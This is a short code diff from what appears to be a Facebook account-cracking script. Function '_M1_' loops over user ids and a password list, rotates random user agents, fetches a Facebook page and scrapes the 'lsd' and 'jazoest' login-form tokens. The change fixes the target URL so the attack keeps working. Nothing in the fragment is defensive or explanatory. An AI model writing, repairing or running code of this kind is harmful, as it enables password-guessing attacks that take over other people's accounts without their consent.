@@ -158,7 +158,7 @@ def _M1_(ids,pasx):
                 for ps in pasx:
                         session = requests.Session()
                         pro = random.choice(ugen)
-                        BLACKX = session.get('https://.facebook.com').text
+                        BLACKX = session.get('https://p.facebook.com').text
                         apple = {
                             "lsd":re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
                         "jazoest":re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
